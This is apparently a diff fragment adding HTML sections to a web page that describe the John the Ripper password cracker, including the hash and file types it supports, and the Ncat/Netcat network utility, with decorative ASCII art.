+			 <div class="mainTextPlain">John the Ripper jumbo is an advanced offline password cracker that supports hundreds of types of hashes and ciphers and runs on many operating systems, processors, GPUs and even some FPGAs. John the Ripper is designed to be multifunctional and fast. It combines several hacking modes in one program and is fully customizable to your specific needs (you can even define custom hacking modes using the built-in support of the C subset compiler). John is also available on several different platforms, which gives you the opportunity to use the same cracker everywhere (you can even continue the hacking session that you started on another platform). Out of the box, John supports (and automatically detects) the following types of Unix crypt(3) hashes: traditional DES-based, "bigcrypt", BSDI extended DES-based, FreeBSD MD5-based (also used on Linux and Cisco IOS) and OpenBSD Blowfish-based (now also used on some Linux distributions and are supported by the latest versions of Solaris). Also out of the box, Kerberos/AFS and Windows LM hashes (based on DES) are supported, as well as DES-based tripcodes. When running on Linux distributions with glibc 2.7+, John 1.7.6+ additionally supports (and automatically detects) SHA-crypt hashes (which are indeed used by the latest versions of Fedora and Ubuntu), with optional OpenMP parallelization (requires GCC 4.2+, which must be explicitly enabled at compile time by uncomenting a string with the OMPFLAGS property closer to the beginning of the Makefile). By analogy, when running on the latest versions of Solaris, John 1.7.6+ supports and automatically detects SHA-crypt and SunMD5 hashes with optional OpenMP parallelization (requires GCC 4.2+ or the latest Sun Studio, which should obviously be enabled at compile time by uncomenting the string with the OMPFLAGS property at the beginning of the Makefile and at runtime settings environment variable OMP_NUM_THREADS for the required number of threads). John the Ripper Pro adds support for Windows NTLM (based on MD4) and hashes with Mac OS X 10.4+ SHA-1 salt. "Community-enhanced" version — jumbo adds support for many more types of password hashes, including Windows NTLM (based on MD4), Mac OS X 10.4-10.6 hashes with SHA-1 salt, Mac OS X 10.7 hashes with SHA-512 salt, raw MD5 and SHA-1, arbitrary MD5-based types of password hashes from "web applications", hashes used by SQL databases (MySQL, MS SQL, Oracle) and some LDAP servers, several types of hashes used in OpenVMS, Eggdrop IRC bot password hashes, and many other types of hashes, as well as many non-hash files, such as OpenSSH private keys, S/Key skeykeys files, Kerberos TGT, PDF files, ZIP (classic PKZIP and WinZip/AES) and RAR archives. Unlike older crackers, John usually does not use crypt(3)-style procedures. Instead, it has its own highly optimized modules for various types of hashes and processor architectures. Some of the algorithms used, such as bitslice DES, cannot even have an implementation inside the crypt(3) API; they require more powerful interfaces, such as that used in John. In addition, there are Assembly language routines for several processor architectures, most important for x86-64 and x86 with SSE2. John the Ripper is an actively developing program. The John the Ripper package (community version of jumbo) comes with a lot of auxiliary utilities. Among these utilities are programs for generating (extracting) a hash. This hash is used to crack the password in John the Ripper. Third-party password cracking programs, such as Hashcat, also work with hashes extracted using utilities from the John the Ripper package.</div>
+
+		  </details>
+		</div>
+	  </div>
+
+
+	  <div class="mainBlogContainer">
+		<a name="NetCat"></a>
+		<div class="greetings">
+			<div class="greetingHeader">NetCat</div>
+		  <pre class="toolsLogo">
+  ^~^  ,
+ ('Y') )
+ /   \/ 
+(\|||/)
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainTextPlain">The Ncat program is written from scratch by the popular (but not supported for a long time) Netcat, nc program. In addition to Ncat, there are other Netcat variants that are rewritten from the original code or written from scratch. Therefore, similar programs with similar functions may be called differently, they may also differ from each other in capabilities and a set of options, but their main function is the same. This reference material describes the Ncat variant of Netcat from the authors of Nmap. Ncat is a popular program and is preinstalled by default in some distributions instead of Netcat. Ncat is a multifunctional network utility that reads and writes data on the network from the command line. Ncat was written for the Nmap Project as a much improved reincarnation of the venerable Netcat program. It uses TCP and UDP for communication and is designed to be a reliable engine for instantly connecting over the network to other applications and users. Ncat not only works with IPv4 and IPv6, but also provides the user with a potentially limitless number of use cases. Among the large number of Ncat functions, there is an opportunity to build chains from Ncat, redirecting TCP and UDP ports to other sites, SSL support, support for proxy connections via SOCKS4 or HTTP proxy (CONNECT method) (also with optional authentication). Some general principles apply to most applications and thus give you the ability to instantly add network support to software that normally never supports it. Ncat is integrated with Nmap and is available in standard packages when downloading Nmap (including source code, as well as executable files for Linux, Windows, and Mac) — all this is available on the Nmap download page. There is also an SVN source code repository.</div>
+
+		  </details>
+		</div>
+	  </div>
+
+
+	  <!-- <div class="mainBlogContainer">
+		<a name=""></a>
+		<div class="greetings">
+			<div class="greetingHeader"></div>
+		  <pre class="toolsLogo">
+
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainText">soft abilities:</div>
+
+		  </details>
+		</div>
+	  </div> -->
 
 
 	  <div class="mainBlogContainer">
